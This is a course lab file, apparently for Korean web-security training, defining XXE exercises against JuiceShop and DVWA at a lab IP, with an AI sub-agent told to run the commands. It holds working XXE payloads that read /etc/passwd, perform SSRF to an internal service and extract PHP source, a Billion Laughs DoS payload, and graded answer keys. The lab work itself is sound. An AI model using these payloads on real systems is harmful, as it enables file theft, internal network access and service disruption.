lab_id: web-vuln-ai-week08
title: XXE (XML External Entity) 실습 (AI 지원)
version: ai
course: web-vuln-ai
week: 8
description: XML 외부 엔티티 주입을 통한 파일 읽기, SSRF, DoS 공격을 JuiceShop과 DVWA 환경에서 실습합니다. AI
  SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- XXE 공격의 원리와 XML 파서 동작을 이해한다
- 로컬 파일 읽기 및 SSRF 공격을 실습한다
- Blind XXE와 Out-of-Band 기법을 학습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 대상 웹 서버({{WEB_IP}})에서 XML 입력을 받는 엔드포인트를 탐색하시오. JuiceShop(:3000)의 API
    엔드포인트 목록을 확인하라.
  hint: 'curl로 JuiceShop의 /api 경로에 접근하고, Content-Type: application/xml 헤더로 POST 요청을
    보내 XML 파싱 여부를 확인하세요.'
  category: recon
  points: 8
  answer: "\U0001F916 프롬프트: 대상 웹 서버(10.20.30.80)에서 XML 입력을 받는 엔드포인트를 탐색하시오. JuiceShop(:3000)의\
    \ API 엔드포인트 목록을 확인해줘\n\U0001F4CE 참고 (CLI): curl -s http://10.20.30.80:3000/api/\
    \ && curl -s -X POST http://10.20.30.80:3000/api/Products/ \\\n  -H 'Content-Type:\
    \ application/xml' \\\n  -d '<test>1</test>' \\\n  -o /dev/null \\\n  -w '%{http_code}'"
  answer_detail: XML을 처리하는 엔드포인트를 찾는 것이 XXE 공격의 첫 단계입니다. Content-Type을 application/xml로
    변경하여 서버가 XML을 파싱하는지 확인합니다. 200 또는 500 응답이 오면 XML 파서가 동작하는 것입니다.
  verify:
    type: output_contains
    expect: api
    field: stdout
    semantic:
      intent: XML 입력 엔드포인트 탐색 — API 목록에서 Content-Type application/xml 수락하는 엔드포인트 식별
      success_criteria:
      - JuiceShop API 엔드포인트 목록 수집
      - OPTIONS 또는 응답 Content-Type 으로 XML 지원 판정
      - 엔드포인트 최소 1개 식별
      acceptable_methods:
      - curl <url>/api-docs 또는 swagger.json
      - Burp Suite 사이트맵
      - ffuf 로 API 경로 탐색
      - 응답 헤더 Accept/Content-Type 확인
      negative_signs:
      - API 탐색 없음
      - XML 수락 판정 없음
      - 엔드포인트 미식별
  target_vm: attacker
  script: "curl -s http://10.20.30.80:3000/api/ && curl -s -X POST http://10.20.30.80:3000/api/Products/\
    \ \\\n  -H 'Content-Type: application/xml' \\\n  -d '<test>1</test>' \\\n  -o\
    \ /dev/null \\\n  -w '%{http_code}'"
  risk_level: low
  bastion_prompt: '대상 웹 서버(10.20.30.80)에서 XML 입력을 받는 엔드포인트를 탐색하시오. JuiceShop(:3000)의
    API 엔드포인트 목록을 확인해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: 기본 XXE 페이로드를 작성하여 /etc/hostname 파일을 읽어라. SYSTEM 키워드로 외부 엔티티를 선언하고 /tmp/xxe_basic.xml에
    저장한 뒤 전송하라.
  hint: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><comment><text>&xxe;</text></comment>
    형태를 사용하세요.
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: 기본 XXE 페이로드를 작성하여 /etc/hostname 파일을 읽어라 구현 방법과 예시를 설명해줘\n\
    \U0001F4CE 참고 (CLI): cat > /tmp/xxe_basic.xml << 'XMLEOF'\n<?xml version=\"1.0\"\
    \ encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\"\
    >\n]>\n<comment><text>&xxe;</text></comment>\nXMLEOF\ncat /tmp/xxe_basic.xml &&\
    \ echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type:\
    \ application/xml' -d @/tmp/xxe_basic.xml"
  answer_detail: XXE는 XML 파서가 DOCTYPE 선언 내의 ENTITY를 처리할 때 발생합니다. SYSTEM 키워드로 file://
    프로토콜을 사용하면 서버의 로컬 파일을 읽을 수 있습니다. 파서가 외부 엔티티를 확장하면 파일 내용이 응답에 포함됩니다.
  verify:
    type: output_contains
    expect:
    - ENTITY xxe SYSTEM
    - xxe
    field: stdout
    semantic:
      intent: 기본 XXE — DOCTYPE + ENTITY SYSTEM 으로 /etc/hostname 외부 파일 로드 후 XML 본문에
        반영
      success_criteria:
      - DOCTYPE + ENTITY xxe SYSTEM file:///etc/hostname 포함 페이로드
      - /tmp/xxe_basic.xml 파일 저장 + cat 확인
      - XML 본문에서 &xxe; 참조 사용
      acceptable_methods:
      - heredoc 으로 XML 파일 작성
      - echo -e 로 작성
      - python ElementTree 로 동적 생성
      - Burp Repeater 로 전송
      negative_signs:
      - SYSTEM 없는 일반 XML
      - 엔티티 참조 누락
      - 파일 저장 없음
  target_vm: attacker
  script: "cat > /tmp/xxe_basic.xml << 'XMLEOF'\n<?xml version=\"1.0\" encoding=\"\
    UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n\
    ]>\n<comment><text>&xxe;</text></comment>\nXMLEOF\ncat /tmp/xxe_basic.xml && echo\
    \ '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type:\
    \ application/xml' -d @/tmp/xxe_basic.xml"
  risk_level: medium
  bastion_prompt: '기본 XXE 페이로드를 작성하여 /etc/hostname 파일을 읽어라. SYSTEM 키워드로 외부 엔티티를 선언하고
    /tmp/xxe_basic.xml에 저장한 뒤 전송하라.


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: XXE를 이용하여 /etc/passwd 파일을 읽으시오. 시스템 사용자 목록을 추출하라.
  hint: ENTITY 선언에서 file:///etc/passwd를 지정하고, 엔티티 참조(&xxe;)를 XML 요소 값에 넣으세요.
  category: exploit
  points: 12
  answer: '🤖 프롬프트: XXE를 이용하여 /etc/passwd 파일을 읽으시오해줘

    📎 참고 (CLI): echo ''=== XXE /etc/passwd Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/
    -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY
    xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'' -w ''\nHTTP_CODE:%{http_code}'''
  answer_detail: /etc/passwd는 XXE 공격의 대표적 PoC 파일입니다. root:x:0:0 형태의 내용이 응답에 포함되면 서버의
    로컬 파일 읽기가 가능한 것입니다. 401 응답은 엔드포인트가 인증을 요구하지만 XML 파서가 존재함을 의미합니다.
  verify:
    type: output_contains
    expect:
    - XXE /etc/passwd Test
    - root
    field: stdout
    semantic:
      intent: '/etc/passwd 추출 XXE — file:///etc/passwd 페이로드 전송 후 응답에 root: 라인 포함 여부
        판정'
      success_criteria:
      - file:///etc/passwd 엔티티 로드 페이로드
      - curl 로 엔드포인트에 전송 후 응답 분석
      - 'root:x: 형식 라인 추출 확인'
      acceptable_methods:
      - curl -X POST -H Content-Type:application/xml -d <payload>
      - Burp Repeater
      - python requests
      - xmlrpc_client
      negative_signs:
      - 전송 없이 파일만 작성
      - 응답 분석 없음
      - 성공 판정 없음
  target_vm: attacker
  script: 'echo ''=== XXE /etc/passwd Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/
    -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY
    xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'' -w ''\nHTTP_CODE:%{http_code}'''
  risk_level: medium
  bastion_prompt: 'XXE를 이용하여 /etc/passwd 파일을 읽으시오해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: XXE를 이용한 SSRF(Server-Side Request Forgery) 공격을 수행하시오. 서버가 내부 네트워크의
    localhost:8080(DVWA)에 접근할 수 있는지 확인하라.
  hint: ENTITY SYSTEM 값을 file:// 대신 http://localhost:8080/ 으로 변경하세요.
  category: exploit
  points: 12
  answer: '🤖 프롬프트: XXE를 이용한 SSRF(Server-Side Request Forgery) 공격을 수행해줘

    📎 참고 (CLI): echo ''=== XXE SSRF Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/
    -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY
    xxe SYSTEM "http://localhost:8080/">]><comment><text>&xxe;</text></comment>''
    --max-time 10 -w ''\nHTTP_CODE:%{http_code}'' | head -c 500'
  answer_detail: XXE 기반 SSRF는 서버가 공격자 대신 내부 네트워크에 HTTP 요청을 보내게 합니다. http:// 프로토콜을
    사용하면 방화벽 뒤의 내부 서비스에 접근할 수 있으며, 401 응답은 엔드포인트가 인증을 요구하지만 XML 파서가 존재함을 의미합니다.
  verify:
    type: output_contains
    expect: XXE SSRF Test
    field: stdout
    semantic:
      intent: XXE SSRF — 외부 엔티티 URL 을 내부 서비스(http://localhost:8080 등) 로 지정해 SSRF 유도
      success_criteria:
      - ENTITY SYSTEM http://internal:port 페이로드
      - 내부 서비스 응답 또는 에러 메시지 반영 확인
      - XXE 와 SSRF 결합 원리 설명
      acceptable_methods:
      - XML 페이로드에 http:// URL
      - Burp Collaborator 로 OOB 탐지
      - gopher:// 프로토콜 추가 시도
      - interactsh OOB
      negative_signs:
      - file:// 만 사용
      - 내부 URL 언급 없음
      - SSRF 결합 설명 없음
  target_vm: attacker
  script: 'echo ''=== XXE SSRF Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/
    -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY
    xxe SYSTEM "http://localhost:8080/">]><comment><text>&xxe;</text></comment>''
    --max-time 10 -w ''\nHTTP_CODE:%{http_code}'' | head -c 500'
  risk_level: medium
  bastion_prompt: 'XXE를 이용한 SSRF(Server-Side Request Forgery) 공격을 수행해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: PHP wrapper를 활용한 XXE로 서버의 PHP 소스코드를 Base64 인코딩하여 추출하시오. DVWA의 index.php
    소스를 읽어라.
  hint: php://filter/convert.base64-encode/resource=/var/www/html/index.php 를 ENTITY
    SYSTEM 값으로 사용하세요.
  category: exploit
  points: 12
  answer: '🤖 프롬프트: PHP wrapper를 활용한 XXE로 서버의 PHP 소스코드를 Base64 인코딩하여 추출하시오. DVWA의 index.php
    소스를 읽어라해줘

    📎 참고 (CLI): echo ''=== XXE PHP Wrapper Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/
    -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY
    xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><comment><text>&xxe;</text></comment>''
    -w ''\nHTTP_CODE:%{http_code}'''
  answer_detail: php://filter wrapper는 PHP 스트림을 통해 파일을 읽되, Base64 인코딩을 적용합니다. JuiceShop은
    Node.js 기반이므로 php:// wrapper를 지원하지 않지만, 이 기법은 PHP 기반 서버에서 유효합니다. 401 응답은 인증이 필요한
    엔드포인트임을 의미합니다.
  verify:
    type: output_contains
    expect: XXE PHP Wrapper Test
    field: stdout
    semantic:
      intent: PHP wrapper XXE — php://filter/convert.base64-encode/resource= 로 바이너리
        안전하게 소스 추출
      success_criteria:
      - php://filter 스킴 포함 페이로드
      - base64-encode convert 적용
      - 응답에서 base64 문자열 추출 후 decode 결과 확인
      acceptable_methods:
      - XML 페이로드에 php://filter/convert.base64-encode/resource=/var/www/html/index.php
      - base64 -d 로 디코딩
      - sqlmap --xxe 옵션
      - XXEinjector 도구
      negative_signs:
      - 일반 file:// 만
      - base64 인코딩 없이 바이너리 깨짐
      - 디코딩 단계 누락
  target_vm: attacker
  script: 'echo ''=== XXE PHP Wrapper Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/
    -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY
    xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><comment><text>&xxe;</text></comment>''
    -w ''\nHTTP_CODE:%{http_code}'''
  risk_level: medium
  bastion_prompt: 'PHP wrapper를 활용한 XXE로 서버의 PHP 소스코드를 Base64 인코딩하여 추출하시오. DVWA의 index.php
    소스를 읽어라해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: Billion Laughs(XML Bomb) DoS 페이로드를 구성하여 /tmp/xxe_bomb.xml에 저장하시오. 실제
    전송은 하지 말고 페이로드 구조만 작성하라.
  hint: 엔티티를 중첩 참조하는 XML을 작성하세요. lol 엔티티가 lol2를 참조하고, lol2가 lol3를 참조하는 기하급수적 확장 구조입니다.
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: Billion Laughs(XML Bomb) DoS 페이로드를 구성하여 /tmp/xxe_bomb\
    \ 구현 방법과 예시를 설명해줘\n\U0001F4CE 참고 (CLI): cat > /tmp/xxe_bomb.xml << 'XMLEOF'\n\
    <?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY\
    \ lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3\
    \ \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY\
    \ lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n]>\n\
    <root>&lol4;</root>\nXMLEOF\necho 'XML Bomb payload saved (DO NOT SEND - 학습 목적)'\
    \ && wc -c /tmp/xxe_bomb.xml"
  answer_detail: Billion Laughs(XML Bomb)는 엔티티 중첩 참조로 기하급수적 메모리 소비를 유발합니다. 4단계만으로도
    10^4=10000개의 lol 문자열로 확장되고, 10단계이면 10^10(100억)개로 확장됩니다. 응답 시간이 급격히 증가하면 DoS 취약점이
    존재하는 것입니다.
  verify:
    type: output_contains
    expect: XML Bomb payload saved
    field: stdout
    semantic:
      intent: Billion Laughs XML Bomb — 재귀 엔티티 참조(lol lol2 lol3 ...)로 DoS 유발 페이로드
        /tmp/xxe_bomb.xml 에 저장 (실행 금지)
      success_criteria:
      - 최소 3단계 엔티티 재귀 정의 (&lol; 가 &lol2; 로 참조)
      - 루트 엔트리에 최종 엔티티 사용
      - 실행 금지·안전 목적 문구 포함
      acceptable_methods:
      - heredoc 으로 XML 파일 작성
      - python 으로 동적 생성
      - XMLBomb 예시 참조
      - CWE-776 (Billion Laughs) 매핑
      negative_signs:
      - 재귀 정의 1단계만
      - 실행 금지 문구 없음
      - 파일 저장 없음
  target_vm: attacker
  script: "cat > /tmp/xxe_bomb.xml << 'XMLEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE\
    \ lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"\
    >\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"\
    >\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"\
    >\n]>\n<root>&lol4;</root>\nXMLEOF\necho 'XML Bomb payload saved (DO NOT SEND\
    \ - 학습 목적)' && wc -c /tmp/xxe_bomb.xml"
  risk_level: medium
